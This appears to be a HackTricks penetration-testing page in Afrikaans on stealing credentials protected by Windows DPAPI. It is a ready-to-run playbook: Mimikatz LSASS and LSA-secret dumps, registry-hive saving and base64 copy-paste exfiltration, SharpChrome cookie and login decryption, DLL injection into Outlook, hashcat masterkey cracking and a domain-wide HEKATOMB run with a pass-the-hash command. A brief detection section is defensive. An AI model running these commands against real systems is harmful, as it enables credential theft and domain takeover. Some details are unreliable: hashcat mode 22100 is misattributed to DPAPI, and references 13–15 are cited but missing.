# DPAPI - Onttrekking van wagwoorde

{{#include ../../banners/hacktricks-training.md}}



## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik binne die Windows-bedryfstelsel gebruik vir die **simmetriese enkripsie van asimmetriese private sleutels**, deur gebruiker- of stelselgeheime as ’n belangrike bron van entropie te gebruik. Hierdie benadering vereenvoudig enkripsie vir ontwikkelaars deur hulle in staat te stel om data te enkripteer met ’n sleutel wat van die gebruiker se aanmeldgeheime afgelei is, of, vir stelselenkripsie, van die stelsel se domeinverifikasiegeheime. Dit maak dit dus onnodig vir ontwikkelaars om self die beskerming van die enkripsiesleutel te bestuur.

Die mees algemene manier om DPAPI te gebruik, is deur die **`CryptProtectData` en `CryptUnprotectData`**-funksies, wat toepassings toelaat om data te enkripteer en te dekripteer met behulp van die sekuriteitskonteks van die proses wat tans aangemeld is. By verstek kan die data slegs gedekripteer word deur dieselfde gebruiker- of stelselkonteks wat dit geënkripteer het.<sup>[[2]](#references)[[3]](#references)</sup>

Hierdie funksies aanvaar ook ’n opsionele **entropieparameter** wat tydens enkripsie en dekripsie gebruik word. Data wat met opsionele entropie beskerm word, vereis dieselfde entropiewaarde vir dekripsie.<sup>[[2]](#references)[[6]](#references)</sup>

### Gebruikersleutelgenerering

DPAPI lei ’n gebruikerspesifieke waarde (dikwels ’n **pre-key** genoem) van die gebruiker se geloofsbriewe af. Die presiese afleiding hang af van die rekening en die weergawe van die bedryfstelsel. Impacket probeer byvoorbeeld ’n HMAC-SHA1-pad wat op die SHA-1-digest van die UTF-16LE-wagwoord gebaseer is, ’n ander pad wat op die wagwoord se MD4/NT-hash gebaseer is, en ’n PBKDF2-SHA256-afgeleide pad vir Protected Users. Dit is waarom offline nutsmiddels dikwels die vereiste materiaal uit óf die gewone tekswagwoord óf ’n beskikbare NT-hash kan aflei.<sup>[[2]](#references)[[10]](#references)</sup>

Dit is veral interessant omdat ’n aanvaller, as hulle die gebruiker se wagwoordhash kan bekom, die volgende kan doen:

- **Enige data dekripteer wat met DPAPI geënkripteer is** met daardie gebruiker se sleutel, sonder om enige API te kontak
- Probeer om die **wagwoord offline te kraak** om die geldige DPAPI-sleutel te genereer

DPAPI hou een of meer **meestersleutels** vir elke gebruiker by, eerder as om ’n nuwe meestersleutel vir elke beskermde blob te skep. Elke meestersleutel het ’n **GUID** (Globally Unique Identifier), en ’n geënkripteerde blob teken aan watter meestersleutel dit beskerm.<sup>[[2]](#references)</sup>

Meestersleutels word in die **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**-gids gestoor, waar `{SID}` die gebruiker se Security Identifier is. Die meestersleutellêer bevat materiaal wat deur die gebruiker se **pre-key** beskerm word en, vir domeingebruikers, herstelmateriaal wat deur ’n **domein-rugsteunsleutel** beskerm word.<sup>[[2]](#references)</sup>

Let daarop dat die **domeinsleutel wat gebruik word om die meestersleutel te enkripteer op die domeinbeheerders is en nooit verander nie**. As ’n aanvaller dus toegang tot die domeinbeheerder het, kan hulle die domein-rugsteunsleutel bekom en die meestersleutels van alle gebruikers in die domein dekripteer.<sup>[[2]](#references)</sup>

Die geënkripteerde blobs bevat in hul opskrifte die **GUID van die meestersleutel** wat gebruik is om die data daarin te enkripteer.

> [!TIP]
> DPAPI-geënkripteerde blobs begin met **`01 00 00 00`**

Vind meestersleutels:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

Dit is hoe ’n klomp Master Keys van ’n gebruiker sal lyk:

![What is DPAPI - Users key generation: Dit is hoe ’n klomp Master Keys van ’n gebruiker sal lyk](<../../images/image (1121).png>)

### Masjien-/stelselsleutelgenerering

Dit is die sleutel wat die masjien gebruik om data te enkripteer. Dit is gebaseer op die **DPAPI_SYSTEM LSA-geheim**, wat ’n spesiale sleutel is waartoe slegs die SYSTEM-gebruiker toegang het. Hierdie sleutel word gebruik om data te enkripteer wat deur die stelsel self toeganklik moet wees, soos masjienvlak-geloofsbriewe of stelselwye geheime.<sup>[[2]](#references)</sup>

Let daarop dat hierdie sleutels **nie ’n domeinrugsteun het nie**, dus is hulle slegs plaaslik toeganklik:

- **Mimikatz** kan toegang daartoe kry deur LSA-geheime met die opdrag te dump: `mimikatz lsadump::secrets`
- Die geheim word in die register gestoor, dus kan ’n administrateur die DACL-toestemmings **wysig om toegang daartoe te kry**. Die registerpad is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Vanlyn ekstraksie uit registerhives is ook moontlik. Stoor byvoorbeeld as ’n administrateur op die teiken die hives en eksfiltreer hulle:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

Gebruik dan op jou ontledingsmasjien die hives om die DPAPI_SYSTEM LSA secret te herwin en gebruik dit om DPAPI-blobs met masjienomvang te dekripteer (byvoorbeeld toepassingbewyse of Wi-Fi-profiele wat deur die masjien beskerm word):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam-spesifieke DPAPI-voorbeeld:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### Data wat deur DPAPI beskerm word

Die persoonlike data wat deur DPAPI beskerm word, sluit in:

- Windows-aanmeldbewyse
- Wagwoorde en outovoltooiingsdata van Internet Explorer en Google Chrome
- E-pos- en interne FTP-rekeningwagwoorde vir toepassings soos Outlook en Windows Mail
- Wagwoorde vir gedeelde vouers, hulpbronne, draadlose netwerke en Windows Vault, insluitend enkripsiesleutels
- Wagwoorde vir afstandwerkskermverbindings, .NET Passport en private sleutels vir verskeie enkripsie- en verifikasiedoeleindes
- Netwerkwagwoorde wat deur Credential Manager bestuur word, en persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN messenger en meer
- Geënkripteerde blobs binne die register
- ...

Stelselbeskermde data sluit in:
- Wifi-wagwoorde
- ...

Wagwoorde vir geskeduleerde take is ’n aparte LSA-geheimvraag. ’n Taak wat met die [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) geregistreer is, kan ’n wagwoord stoor vir plaaslike administrateur-/SYSTEM-herstel; ’n S4U- of interaktiewe-token-taak bewys nie dat ’n wagwoord gestoor is nie. ’n Taak se principal en logon type is sterker aanduidings as net die naam van die rekening waaronder dit loop.

### Opsies vir onttrekking van master keys

- As die gebruiker domeinadministrateurregte het, kan hulle toegang tot die **domain backup key** verkry om alle gebruiker-master keys in die domein te dekripteer:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- Met plaaslike adminregte is dit moontlik om **toegang tot die LSASS-geheue te verkry** om die DPAPI-hoofsleutels van alle gekoppelde gebruikers en die SYSTEM-sleutel te onttrek.

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- As die gebruiker plaaslike adminvoorregte het, kan hulle toegang tot die **DPAPI_SYSTEM LSA secret** kry om die masjien-meestersleutels te dekripteer:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- As die gebruiker se password of NTLM-hash bekend is, kan jy die gebruiker se master keys direk **dekripteer**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- As jy binne ’n sessie as die gebruiker is, is dit moontlik om die DC via **RPC** vir die **rugsteunsleutel te vra om die master keys te dekripteer**. As jy ’n plaaslike admin is en die gebruiker aangemeld is, kan jy sy **sessietoken steel**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Lys Vault

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## Toegang tot DPAPI-geënkripteerde data

### Vind DPAPI-geënkripteerde data

Algemene gebruiker se beskermde lêers is in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Kyk ook deur `\Roaming\` in die bogenoemde paaie met `\Local\` te vervang.

Voorbeelde van enumerasie:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kan DPAPI-geënkripteerde blobs in die lêerstelsel, register en B64-blobs vind:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

Let daarop dat [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (van dieselfde repo) gebruik kan word om sensitiewe data soos cookies met DPAPI te dekripteer.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron-vinnigresepte (SharpChrome)

- Huidige gebruiker, interaktiewe dekripsie van gestoorde logins/cookies (werk selfs met Chrome 127+ app-bound cookies omdat die ekstra sleutel uit die gebruiker se Credential Manager opgelos word wanneer dit in gebruikerskonteks uitgevoer word):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- Vanlyn-analise wanneer jy net lêers het. Onttrek eers die AES-staatsleutel uit die profiel se "Local State" en gebruik dit dan om die cookie DB te dekripteer:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- Domeinwye/afgeleë triage wanneer jy die DPAPI-domeinrugsteunsleutel (PVK) en admin op die teikenhost het:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- As jy ’n gebruiker se DPAPI prekey/credkey (van LSASS) het, kan jy wagwoordkraking oorslaan en profieldata direk dekripteer:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

Aantekeninge
- Nuwer Chrome/Edge-bouweergawes kan sekere cookies met "App-Bound"-enkripsie stoor. Vanlyn-dekripsie van daardie spesifieke cookies is nie moontlik sonder die bykomende app-bound key nie; voer SharpChrome in die teikengebruiker se konteks uit om dit outomaties te verkry. Sien die Chrome-sekuriteitsblogplasing waarna hieronder verwys word.<sup>[[5]](#references)</sup>

### Toegangsleutels en data

- **Gebruik SharpDPAPI** om geloofsbriewe uit DPAPI-geënkripteerde lêers van die huidige sessie te verkry:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **Kry aanmeldinligting** soos die geënkripteerde data en die guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **Kry toegang tot masterkeys**:

Dekripteer ’n gebruiker se masterkey deur die **domain backup key** via RPC aan te vra:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

Die **SharpDPAPI**-nutsding ondersteun ook hierdie argumente vir masterkey-dekripsie (let op dat dit moontlik is om `/rpc` te gebruik om die domein se rugsteunsleutel te kry, `/password` om ’n plaintext-wagwoord te gebruik, of `/pvk` om ’n DPAPI-domein se private sleutel-lêer te spesifiseer...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **Dekripteer data met 'n masterkey**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

Die **SharpDPAPI**-tool ondersteun ook hierdie argumente vir `credentials|vaults|rdg|keepass|triage|blob|ps`-dekripsie (let daarop dat dit moontlik is om `/rpc` te gebruik om die domein se rugsteunsleutel te kry, `/password` om ’n plaintext-wagwoord te gebruik, `/pvk` om ’n DPAPI-domein se private sleutel-lêer te spesifiseer, en `/unprotect` om die huidige gebruiker se sessie te gebruik...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- Gebruik ’n DPAPI-prekey/credkey direk (geen wagwoord nodig nie)

As jy LSASS kan dump, stel Mimikatz dikwels ’n DPAPI-sleutel per aanmelding bloot wat gebruik kan word om die gebruiker se masterkeys te dekripteer sonder om die plaintext-wagwoord te ken. Gee hierdie waarde direk aan die gereedskap deur:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- Dekripteer sommige data met die **huidige gebruikersessie**:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Vanlyn dekripsie met Impacket dpapi.py

As jy die slagoffer se gebruiker-SID en wagwoord (of NT-hash) het, kan jy DPAPI-masterkeys en Credential Manager-blobs heeltemal vanlyn dekripteer met Impacket se dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifiseer artefakte op die skyf:
  - Credential Manager-blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - Ooreenstemmende masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- As lêeroordragnutsgoed onbetroubaar is, enkodeer die lêers op die gasheer met base64 en kopieer die uitvoer:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- Dekripteer die masterkey met die gebruiker se SID en wagwoord/hash:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Gebruik die gedekripteerde masterkey om die credential blob te dekripteer:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

Hierdie werkvloei herwin dikwels domeingeloofsbriewe wat deur toepassings met Windows Credential Manager gestoor is, insluitend administrateurrekeninge (bv. `*_adm`).

---

### Hantering van opsionele entropy ("Third-party entropy")

Sommige toepassings gee ’n bykomende **entropy**-waarde aan `CryptProtectData` deur. Sonder hierdie waarde kan die blob nie gedekripteer word nie, selfs al is die korrekte masterkey bekend. Dit is dus noodsaaklik om die entropy te bekom wanneer geloofsbriewe geteiken word wat op hierdie manier beskerm word (bv. Microsoft Outlook, sommige VPN-kliënte).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) is ’n user-mode DLL wat die DPAPI-funksies binne die teikenproses hook en enige opsionele entropy wat verskaf word, deursigtig aanteken. As EntropyCapture in **DLL-injection**-modus teen prosesse soos `outlook.exe` of `vpnclient.exe` uitgevoer word, lewer dit ’n lêer op wat elke entropy-buffer aan die oproepende proses en blob koppel. Die vasgelegde entropy kan later aan **SharpDPAPI** (`/entropy:`) of **Mimikatz** (`/entropy:<file>`) verskaf word om die data te dekripteer.<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Kraak masterkeys offline (Hashcat & DPAPISnoop)

Microsoft het ’n **context 3**-masterkey-formaat begin gebruik vanaf Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desember 2023) het hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) en **22102** (context 3) bygevoeg, wat GPU-versnelde kraking van gebruikerswagwoorde direk vanaf die masterkey-lêer moontlik maak. Aanvallers kan dus woordelys- of brute-force-aanvalle uitvoer sonder om met die teikenstelsel in wisselwerking te tree.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) outomatiseer die proses:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Die tool kan ook Credential- en Vault-blobs ontleed, hulle met gekraakte sleutels dekripteer en cleartext-wagwoorde uitvoer.<sup>[[8]](#references)</sup>


### Toegang tot data op ander masjiene

In **SharpDPAPI and SharpChrome** kan jy die **`/server:HOST`**-opsie spesifiseer om toegang tot ’n afgeleë masjien se data te kry. Jy moet natuurlik toegang tot daardie masjien hê, en in die volgende voorbeeld word aanvaar dat die **domein se rugsteun-enkripsiesleutel bekend is**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

### SSRS-verslagbedienerdatabasisverbinding

Op ’n SQL Server Reporting Services (SSRS)-gasheer kan `RSReportServer.config` ’n geënkripteerde `<Dsn>` vir die verslagbedienerdatabasis bevat.<sup>[[15]](#references)</sup> SSRS beskerm hierdie verbindingsinstellings met ’n **plaaslike masjienvlak-sleutel**; geloofsbriewe vir eksterne verslagdatabronne word eerder in die verslagbedienerdatabasis met sy simmetriese sleutel geënkripteer.<sup>[[14]](#references)</sup>

In die gerapporteerde geval het die aanvaller die `Dsn` onttrek en probeer om die Base64-gedekodeerde grepe daarvan met `ProtectedData.Unprotect` en die `LocalMachine`-omvang te dekripteer.<sup>[[13]](#references)</sup>

Met leestoegang tot die SSRS-konfigurasielêer op die masjien wat dit beskerm het, spoor die werklike instansiepad op en ondersoek die waarde. Die voorbeeldpad is vir SSRS 2017 en later; beskerming op masjienvlak vereis nie die SSRS-diensrekening se konteks nie.<sup>[[14]](#references)[[15]](#references)</sup>

```powershell
$path = 'C:\Program Files\Microsoft SQL Server Reporting Services\SSRS\ReportServer\rsreportserver.config'
$config = Get-Content $path -Raw
$b64 = [regex]::Match($config, '<Dsn>([^<]+)</Dsn>').Groups[1].Value
$blob = [Convert]::FromBase64String($b64)
$plain = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, 'LocalMachine')
[Text.Encoding]::UTF8.GetString($plain)
```

’n Leë of ontbrekende `Dsn` gee hierdie metode niks om te dekripteer nie.<sup>[[15]](#references)</sup> ’n Gedecrypteerde connection string bevat **nie** noodwendig ’n herbruikbare wagwoord nie: SSRS kan sy diensrekening gebruik, of ’n gekonfigureerde domeinrekening kan afsonderlike `LogonUser`-, `LogonDomain`- en `LogonCred`-instellings hê.<sup>[[15]](#references)</sup> Om slegs die geënkripteerde waarde na ’n ander masjien te kopieer, gee daardie masjien nie die beskermingsleutel van die oorspronklike gasheer nie.<sup>[[14]](#references)</sup>

Vir ander SQL Server-toegangspaaie, sien [MSSQL pentesting](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/).

## Ander tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is ’n tool wat die onttrekking van alle gebruikers en rekenaars uit die LDAP-gids en die onttrekking van die domeinbeheerder se back-up key deur RPC outomatiseer. Die script bepaal dan die IP-adres van alle rekenaars en voer ’n smbclient op almal uit om alle DPAPI-blobs van alle gebruikers te kry en alles met die domein se back-up key te dekripteer.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met die lys rekenaars wat uit LDAP onttrek is, kan jy elke subnet vind, selfs al het jy nie daarvan geweet nie!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan geheime wat deur DPAPI beskerm word outomaties dump. Die 2.x-vrystelling het die volgende bekendgestel:<sup>[[9]](#references)</sup>

* Parallelle versameling van blobs vanaf honderde gashere
* Ontleding van **context 3**-masterkeys en outomatiese integrasie met Hashcat vir cracking
* Ondersteuning vir Chrome se "App-Bound"-geënkripteerde koekies (sien volgende afdeling)
* ’n Nuwe **`--snapshot`**-modus om eindpunte herhaaldelik te poll en nuutgeskepte blobs te vergelyk

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) is ’n C#-parser vir masterkey-, credential- en vault-lêers wat Hashcat/JtR-formate kan uitvoer en opsioneel outomaties cracking kan uitvoer. Dit ondersteun masjien- en gebruiker-masterkey-formate ten volle, tot en met Windows 11 24H1.<sup>[[8]](#references)</sup>


## Algemene opsporingsmetodes

- Toegang tot lêers in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` en ander DPAPI-verwante gidse.
    - Veral vanaf ’n netwerkdeel soos **C$** of **ADMIN$**.
- Gebruik van **Mimikatz**, **SharpDPAPI** of soortgelyke tools om toegang tot LSASS-geheue te kry of masterkeys te dump.
- Gebeurtenis **4662**: *’n Bewerking is op ’n objek uitgevoer* – kan met toegang tot die **`BCKUPKEY`**-objek gekorreleer word.
- Gebeurtenis **4673/4674** wanneer ’n proses *SeTrustedCredManAccessPrivilege* versoek (Credential Manager)

---
### Kwesbaarhede en ekosisteemveranderinge, 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). ’n Aanvaller met netwerktoegang kon ’n domeinlid mislei om ’n kwaadwillige DPAPI-back-up key op te haal, wat die dekripsie van gebruikers se masterkeys moontlik maak. Dit is in die kumulatiewe opdatering van November 2023 reggemaak – administrateurs moet verseker dat DC’s en werkstasies volledig opgedateer is.<sup>[[4]](#references)</sup>
* **Chrome 127 se “App-Bound”-koekie-enkripsie** (Julie 2024) het die ou DPAPI-alleen-beskerming vervang met ’n bykomende sleutel wat in die gebruiker se **Credential Manager** gestoor word. Vanlyn dekripsie van koekies vereis nou beide die DPAPI-masterkey en die **GCM-wrapped app-bound key**. SharpChrome v2.3 en DonPAPI 2.x kan die bykomende sleutel herwin wanneer dit met gebruikerskonteks loop.<sup>[[5]](#references)</sup>


### Gevallestudie: Zscaler Client Connector – Pasgemaakte entropy afgelei van SID

Zscaler Client Connector stoor verskeie konfigurasielêers onder `C:\ProgramData\Zscaler` (bv. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Elke lêer word met **DPAPI (Machine scope)** geënkripteer, maar die verskaffer voorsien **pasgemaakte entropy** wat *tydens looptyd bereken* word, eerder as om dit op skyf te stoor.<sup>[[1]](#references)</sup>

Die entropy word uit twee elemente saamgestel:

1. ’n Hardgekodeerde geheim wat in `ZSACredentialProvider.dll` ingebed is.
2. Die **SID** van die Windows-rekening waaraan die konfigurasie behoort.

Die algoritme wat deur die DLL geïmplementeer word, is gelykstaande aan:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Omdat die geheim ingebed is in ’n DLL wat vanaf die skyf gelees kan word, **kan enige plaaslike aanvaller met SYSTEM-regte die entropie vir enige SID hergenereer** en die blobs vanlyn dekripteer:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Decryption lewer die volledige JSON-konfigurasie, insluitend elke **device posture check** en die verwagte waarde daarvan – inligting wat baie waardevol is wanneer client-side bypasses probeer word.

> WENK: die ander geënkripteerde artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) word met DPAPI beskerm **sonder** entropy (`16` nulgrepe). Hulle kan dus direk met `ProtectedData.Unprotect` gedekripteer word sodra SYSTEM-regte verkry is.

## References

- [1] [Synacktiv – Moet jy jou zero trust vertrou? Omseiling van Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI-geheime. Sekuriteitsontleding en dataherwinning in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Lees van DPAPI-geënkripteerde geheime met Mimikatz en C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing-kwesbaarheid](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Verbetering van die sekuriteit van Chrome-koekies op Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Eenvoudige onttrekking van DPAPI-opsionele entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6-vrystellingsnotas](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub-bewaarplek](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI-projekbladsy](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: Misbruik van AD ACL, kraking van KeePassXC Argon2 en DPAPI-dekripsie tot DC-admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Gebruik en opsies](https://github.com/GhostPack/SharpDPAPI)
